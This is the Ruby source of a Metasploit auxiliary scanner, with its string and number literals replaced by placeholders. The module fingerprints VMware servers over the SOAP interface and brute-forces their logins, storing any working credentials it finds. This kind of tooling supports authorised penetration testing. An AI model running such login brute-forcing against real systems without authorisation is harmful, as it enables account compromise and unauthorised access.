require <str> require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: VIMSoap include Msf :: Exploit :: Remote :: HttpClient include Msf :: Auxiliary :: Report include Msf :: Auxiliary :: AuthBrute include Msf :: Auxiliary :: Scanner def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] ] , <str> = > MSF_LICENSE , <str> = > { <str> = > true } ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , Opt :: RPORT ( <int> ) ] , self . class ) end def report_cred ( opts ) service_data = { <str> : opts [ <str> ] , <str> : opts [ <str> ] , <str> : <str> , <str> : <str> , <str> : myworkspace_id } credential_data = { <str> : <str> , <str> : fullname , <str> : opts [ <str> ] , <str> : opts [ <str> ] , <str> : <str> } . merge ( service_data ) login_data = { <str> : DateTime . now , <str> : create_credential ( credential_data ) , <str> : Metasploit :: Model :: Login :: Status :: SUCCESSFUL , <str> : opts [ <str> ] } . merge ( service_data ) create_credential_login ( login_data ) end def run_host ( ip ) return unless is_vmware? each_user_pass { | user , pass | result = vim_do_login ( user , pass ) case result when <str> print_good <str> rhost <str> rport <str> user <str> pass <str> report_cred ( <str> : rhost , <str> : rport , <str> : user , <str> : pass , <str> : result ) return if datastore [ <str> ] when <str> print_error <str> rhost <str> rport <str> user <str> pass <str> end } end def is_vmware? soap_data = <str> begin res = send_request_cgi ( { <str> = > normalize_uri ( datastore [ <str> ] ) , <str> = > <str> , <str> = > <str> , <str> = > soap_data } , <int> ) if res fingerprint_vmware ( res ) else vprint_error ( <str> rhost <str> rport <str> ) end rescue :: Rex :: ConnectionError = > e vprint_error ( <str> rhost <str> rport <str> ) return false rescue vprint_error ( <str> rhost <str> rport <str> e <str> ) return false end end def fingerprint_vmware ( res ) unless res vprint_error ( <str> rhost <str> rport <str> ) return false end return false unless res . body . include? ( <str> ) os_match = res . body . match ( <str> ) ver_match = res . body . match ( <str> ) build_match = res . body . match ( <str> ) full_match = res . body . match ( <str> ) if full_match print_good <str> rhost <str> rport <str> full_match [ <int> ] <str> report_service ( <str> = > rhost , <str> = > rport , <str> = > <str> , <str> = > <str> , <str> = > full_match [ <int> ] ) end if os_match and ver_match and build_match if os_match [ <int> ] =~ <str> or os_match [ <int> ] =~ <str> report_note ( <str> = > ip , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > os_match [ <int> ] + <str> + ver_match [ <int> ] , <str> = > build_match [ <int> ] } ) end return true else vprint_error ( <str> rhost <str> rport <str> ) return false end end end 
